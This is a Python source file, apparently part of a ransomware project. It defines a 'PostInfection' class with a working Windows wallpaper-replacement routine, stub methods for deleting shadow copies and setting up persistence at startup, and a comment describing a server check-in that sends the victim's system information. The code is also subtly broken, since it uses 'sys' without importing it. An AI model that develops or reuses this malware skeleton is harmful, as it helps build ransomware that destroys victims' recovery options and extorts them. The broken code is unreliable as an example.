import os
import ctypes

class PostInfection(object):

    def __init__(self):
        print("PostInfection Object Created")
        self.logo = self.resource_path(["images"],"logo.png")
        self.wallpaper = self.resource_path(["images"],"wallpaper.png")    

    def resource_path(self, folders, filename):
        """ Get absolute path to resource, works for dev and for PyInstaller """
        try:
            # PyInstaller creates a temp folder and stores path in _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        for fol in folders:
            base_path = os.path.join(base_path,fol)

        return os.path.join(base_path, filename) 
    
    def changeWallpaper(self):

        _status = ctypes.windll.user32.SystemParametersInfoW(0x14, 0, self.wallpaper, 0x2)
        if _status:
            print("Wallpaper has been changed")
        else:
            print("The problem has occured on changing wallpaper")

    def deleteShadowFiles(self):
        print("deleteShadowFiles")
    
    def setItselfStartUpApplication(self):
        print("setItselfStartUpApplication")


"""
POST /api/user/?action=firsttouch&id=1
H
H
H

system information encrypted with RSA public key of victim
"""